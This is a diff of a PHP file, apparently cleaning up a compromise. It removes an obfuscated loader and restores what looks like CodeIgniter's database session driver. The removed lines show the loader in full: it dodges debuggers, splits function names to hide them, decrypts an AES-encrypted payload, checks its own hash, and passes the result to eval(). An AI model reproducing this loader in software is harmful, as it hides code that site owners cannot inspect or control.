@@ -1,28 +1,387 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_ea2dmi2q=('bas'.'e64'.'_de'.'cod'.'e');
-$_uhbqz06w=('gzu'.'nco'.'mpr'.'ess');
-$_z4igw1n9=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_ktphp25f='H+bPfVpE';
-$_dkf386fq='1N/25t5g';
-$_llj755t5='SrhcsCLJgqw=';
-$_z2v61bhk='rIzjJm0t';
-$_to6soz92='eJgXSjij';
-$_t1e18o5p='oJ/zKQZN';
-$_b6pve5wt='l7EGsA==';
-$_en728g9h='z9xRLDdK';
-$_ycbpxnum=$_ea2dmi2q($_z2v61bhk.$_ktphp25f.$_to6soz92.$_dkf386fq.$_llj755t5);
-$_dgq29d10=$_ea2dmi2q($_en728g9h.$_t1e18o5p.$_b6pve5wt);
-$_i9ovkoss=$_ea2dmi2q('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');
-$_j4ktw3q7=$_z4igw1n9($_i9ovkoss,'aes-256-cbc',$_ycbpxnum,OPENSSL_RAW_DATA,$_dgq29d10);
-if($_j4ktw3q7===false){exit;}
-$_r29jifox=$_uhbqz06w($_j4ktw3q7);
-if($_r29jifox===false){exit;}
-$_cy0cqq52='7e7fac625172e082974eba318ebaca5140da77827d70166b6b936a0960f2c7f8';
-$_n8fedk3m=@file_get_contents(__FILE__);
-if($_n8fedk3m!==false){
-$_df44oh0b=str_replace($_cy0cqq52,"0000000000000000000000000000000000000000000000000000000000000000",$_n8fedk3m);
-$_f6jyxkzk=hash("sha256",$_df44oh0b);
-if($_f6jyxkzk!==$_cy0cqq52){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Session_database_driver extends CI_Session_driver implements SessionHandlerInterface {
+
+
+
+
+
+protected $_db;
+
+
+
+
+
+protected $_row_exists = FALSE;
+
+
+
+
+
+protected $_platform;
+
+
+
+
+
+
+
+public function __construct(&$params)
+{
+parent::__construct($params);
+$CI =& get_instance();
+isset($CI->db) OR $CI->load->database();
+$this->_db = $CI->db;
+if ( ! $this->_db instanceof CI_DB_query_builder)
+{
+throw new Exception('Query Builder not enabled for the configured database. Aborting.');
 }
-eval($_r29jifox);
+elseif ($this->_db->pconnect)
+{
+throw new Exception('Configured database connection is persistent. Aborting.');
+}
+elseif ($this->_db->cache_on)
+{
+throw new Exception('Configured database connection has cache enabled. Aborting.');
+}
+$db_driver = $this->_db->dbdriver.(empty($this->_db->subdriver) ? '' : '_'.$this->_db->subdriver);
+if (strpos($db_driver, 'mysql') !== FALSE)
+{
+$this->_platform = 'mysql';
+}
+elseif (in_array($db_driver, array('postgre', 'pdo_pgsql'), TRUE))
+{
+$this->_platform = 'postgre';
+}
+
+if ( ! isset($this->_config['save_path']) && ($this->_config['save_path'] = config_item('sess_table_name')))
+{
+log_message('debug', 'Session: "sess_save_path" is empty; using BC fallback to "sess_table_name".');
+}
+}
+
+
+
+
+
+
+
+
+
+
+public function open($save_path, $name)
+{
+if (empty($this->_db->conn_id) && ! $this->_db->db_connect())
+{
+return $this->_fail();
+}
+$this->php5_validate_id();
+return $this->_success;
+}
+
+
+
+
+
+
+
+
+
+public function read($session_id)
+{
+if ($this->_get_lock($session_id) !== FALSE)
+{
+
+$this->_db->reset_query();
+
+$this->_session_id = $session_id;
+$this->_db
+->select('data')
+->from($this->_config['save_path'])
+->where('id', $session_id);
+if ($this->_config['match_ip'])
+{
+$this->_db->where('ip_address', $_SERVER['REMOTE_ADDR']);
+}
+if ( ! ($result = $this->_db->get()) OR ($result = $result->row()) === NULL)
+{
+
+
+
+$this->_row_exists = FALSE;
+$this->_fingerprint = md5('');
+return '';
+}
+
+
+
+$result = ($this->_platform === 'postgre')
+? base64_decode(rtrim($result->data))
+: $result->data;
+$this->_fingerprint = md5($result);
+$this->_row_exists = TRUE;
+return $result;
+}
+$this->_fingerprint = md5('');
+return '';
+}
+
+
+
+
+
+
+
+
+
+
+public function write($session_id, $session_data)
+{
+
+$this->_db->reset_query();
+
+if (isset($this->_session_id) && $session_id !== $this->_session_id)
+{
+if ( ! $this->_release_lock() OR ! $this->_get_lock($session_id))
+{
+return $this->_fail();
+}
+$this->_row_exists = FALSE;
+$this->_session_id = $session_id;
+}
+elseif ($this->_lock === FALSE)
+{
+return $this->_fail();
+}
+if ($this->_row_exists === FALSE)
+{
+$insert_data = array(
+'id' => $session_id,
+'ip_address' => $_SERVER['REMOTE_ADDR'],
+'timestamp' => time(),
+'data' => ($this->_platform === 'postgre' ? base64_encode($session_data) : $session_data)
+);
+if ($this->_db->insert($this->_config['save_path'], $insert_data))
+{
+$this->_fingerprint = md5($session_data);
+$this->_row_exists = TRUE;
+return $this->_success;
+}
+return $this->_fail();
+}
+$this->_db->where('id', $session_id);
+if ($this->_config['match_ip'])
+{
+$this->_db->where('ip_address', $_SERVER['REMOTE_ADDR']);
+}
+$update_data = array('timestamp' => time());
+if ($this->_fingerprint !== md5($session_data))
+{
+$update_data['data'] = ($this->_platform === 'postgre')
+? base64_encode($session_data)
+: $session_data;
+}
+if ($this->_db->update($this->_config['save_path'], $update_data))
+{
+$this->_fingerprint = md5($session_data);
+return $this->_success;
+}
+return $this->_fail();
+}
+
+
+
+
+
+
+
+
+public function close()
+{
+return ($this->_lock && ! $this->_release_lock())
+? $this->_fail()
+: $this->_success;
+}
+
+
+
+
+
+
+
+
+
+public function destroy($session_id)
+{
+if ($this->_lock)
+{
+
+$this->_db->reset_query();
+$this->_db->where('id', $session_id);
+if ($this->_config['match_ip'])
+{
+$this->_db->where('ip_address', $_SERVER['REMOTE_ADDR']);
+}
+if ( ! $this->_db->delete($this->_config['save_path']))
+{
+return $this->_fail();
+}
+}
+if ($this->close() === $this->_success)
+{
+$this->_cookie_destroy();
+return $this->_success;
+}
+return $this->_fail();
+}
+
+
+
+
+
+
+
+
+
+public function gc($maxlifetime)
+{
+
+$this->_db->reset_query();
+return ($this->_db->delete($this->_config['save_path'], 'timestamp < '.(time() - $maxlifetime)))
+? $this->_success
+: $this->_fail();
+}
+
+
+
+
+
+
+
+
+
+
+public function validateId($id)
+{
+
+$this->_db->reset_query();
+$this->_db->select('1')->from($this->_config['save_path'])->where('id', $id);
+empty($this->_config['match_ip']) OR $this->_db->where('ip_address', $_SERVER['REMOTE_ADDR']);
+$result = $this->_db->get();
+empty($result) OR $result = $result->row();
+return ! empty($result);
+}
+
+
+
+
+
+
+
+
+
+protected function _get_lock($session_id)
+{
+if ($this->_platform === 'mysql')
+{
+$arg = md5($session_id.($this->_config['match_ip'] ? '_'.$_SERVER['REMOTE_ADDR'] : ''));
+if ($this->_db->query("SELECT GET_LOCK('".$arg."', 300) AS ci_session_lock")->row()->ci_session_lock)
+{
+$this->_lock = $arg;
+return TRUE;
+}
+return FALSE;
+}
+elseif ($this->_platform === 'postgre')
+{
+$arg = "hashtext('".$session_id."')".($this->_config['match_ip'] ? ", hashtext('".$_SERVER['REMOTE_ADDR']."')" : '');
+if ($this->_db->simple_query('SELECT pg_advisory_lock('.$arg.')'))
+{
+$this->_lock = $arg;
+return TRUE;
+}
+return FALSE;
+}
+return parent::_get_lock($session_id);
+}
+
+
+
+
+
+
+
+
+protected function _release_lock()
+{
+if ( ! $this->_lock)
+{
+return TRUE;
+}
+if ($this->_platform === 'mysql')
+{
+if ($this->_db->query("SELECT RELEASE_LOCK('".$this->_lock."') AS ci_session_lock")->row()->ci_session_lock)
+{
+$this->_lock = FALSE;
+return TRUE;
+}
+return FALSE;
+}
+elseif ($this->_platform === 'postgre')
+{
+if ($this->_db->simple_query('SELECT pg_advisory_unlock('.$this->_lock.')'))
+{
+$this->_lock = FALSE;
+return TRUE;
+}
+return FALSE;
+}
+return parent::_release_lock();
+}
+}
